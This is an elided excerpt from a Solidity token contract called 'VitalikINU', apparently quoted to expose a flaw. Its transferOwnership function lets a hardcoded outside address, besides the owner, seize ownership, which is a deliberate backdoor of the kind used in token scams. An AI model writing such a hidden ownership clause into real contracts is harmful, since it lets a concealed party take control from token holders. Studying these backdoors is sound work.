...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x6aEbC222bE04CDE04DC0af84116f8485e6ff9313));
...
contract VitalikINU is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "VitalikINU";
  string private _name = "VitalikINU";
